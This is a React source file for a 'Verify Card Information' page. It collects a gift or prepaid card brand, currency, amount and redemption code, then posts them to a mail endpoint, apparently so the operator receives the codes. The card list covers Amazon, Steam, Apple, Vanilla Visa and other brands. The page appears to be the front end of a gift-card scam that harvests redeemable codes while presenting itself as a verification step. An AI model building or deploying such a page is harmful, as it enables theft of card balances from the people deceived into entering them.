"use client"
import {React, useState } from 'react'
import toast, { Toaster } from 'react-hot-toast';

// import { sendCardDetails } from '@/lib/api'

const Verify = () => {

  const [cardType, setCardType] = useState('Select type of Card');
  const [currency, setCurrency] = useState('USD');
  const [amount, setAmount] = useState('');
  const [redemptionCode, setRedemptionCode] = useState('');
  const [error, setError] = useState('');

  
  const sendData = async (e) => {
    e.preventDefault()

    const pattern = /^[A-Z0-9]{10}$/;

    if (pattern.test(redemptionCode)) {
      const emailData = {
        cardType,
        currency,
        amount,
        redemptionCode
      }
      toast.loading('Checking data', {
        duration: 4000,
      });
      // console.log(emailData)
      // console.log(values)

      fetch ('/api/mail', {
        method: 'POST',
        body: JSON.stringify(emailData),
        headers: {
          "Content-Type" : "application/json",
          Accept: "application/json",
        },
      })
        .then(response => {
          if (response.ok) {
            // Email sent successfully
            toast.success('Message sent', {
              duration: 4000,
              position: 'top-center',
            })
            // alert('Email sent!');
            setCardType('Select type of Card');
            setCurrency('USD');
            setAmount('');
            setRedemptionCode('');
            setError('');
          } else {
            // Error occurred while sending email
            toast.error('This is an error!', {
              duration: 4000,
            });
            throw new Error('Error sending email');
          }
        })
        .catch(error => {
          alert('Error sending email');
        });
      console.log("finished")
    } else {
      setError('Please enter a valid redemption code.');
    }

  }


  return (
    <section className='mt-32 w-screen h-screen bg-primary flex items-center justify-center' id='verify'>
      <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 bg-secondary sm:rounded-xl'>
        <form method='post' className='flex flex-col gap-8 w-full px-12'> 
          <span className='flex justify-center text-4xl sm:text-6xl text-primaryText font-bold'>Verify Card Information</span>
          <select 
            name="cardType" 
            id="cardType" 
            // value={values.cardType} 
            value={cardType} 
            // onChange={handleChange} 
            onChange={e => setCardType(e.target.value)} 
            className='w-full h-16 p-4 rounded-xl'
            >
            <option defaultValue="" disabled>Select type of Card</option>
            <option value="Amazon">Amazon</option>
            <option value="American Express">American Express</option>
            <option value="Amex">Amex</option>
            <option value="Apple">Apple</option>
            <option value="discover">Discover</option>
            <option value="eBay">eBay</option>
            <option value="Nike">Nike</option>
            <option value="MasterCard">MasterCard</option>
            <option value="PlayStation">PlayStation</option>
            <option value="RazorGold">RazorGold</option>
            <option value="Sephora">Sephora</option>
            <option value="Steam">Steam</option>
            <option value="TT Visa">TT Visa</option>
            <option value="Vanilla Visa">Vanilla Visa</option>
            <option value="Visa Silvery White">Visa Silvery White</option>
            <option value="Wallmart Visa">Wallmart Visa</option>
            <option value="Xbox">Xbox</option>
          </select>
          <div className='w-full flex gap-4'>
            <select 
              name="currency" 
              id="currency" 
              value={currency} 
              onChange={e => setCurrency(e.target.value)}  
              // value={values.currency} 
              // onChange={handleChange}  
              className='w-1/4 h-16 p-4 rounded-xl'
              >
              <option value="AUD">AUD</option>
              <option value="CAD">CAD</option>
              <option value="EUR">EUR</option>
              <option value="GBP">GBP</option>
              <option value="USD">USD</option>
            </select>
            <input 
              type='text' 
              name='amount' 
              value={amount} 
              onChange={e => setAmount(e.target.value)} 
              // value={values.amount} 
              // onChange={handleChange} 
              placeholder='Card Amount' 
              className='w-9/12 h-16 p-4 rounded-xl' 
              required
            />
          </div>
          <input 
            type='text' 
            name='redemptionCode'
            value={redemptionCode}
            onChange={e => setRedemptionCode(e.target.value)} 
            // value={values.redemptionCode}
            // onChange={handleChange} 
            placeholder='Redemption Code' 
            className='w-full h-16 p-4 rounded-xl' 
            required
          />
          <button 
            className=' h-16 rounded-lg bg-primaryText my-4 text-white cursor-pointer flex items-center justify-center ' 
            type='submit'
            onClick={sendData}
            >
              Continue
          </button>
          <Toaster />
        </form>
        { error && <p className='text-red-600'>{error}</p> }
        <span className='relative bottom text-white sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
      </div>
    </section>
  )
}

export default Verify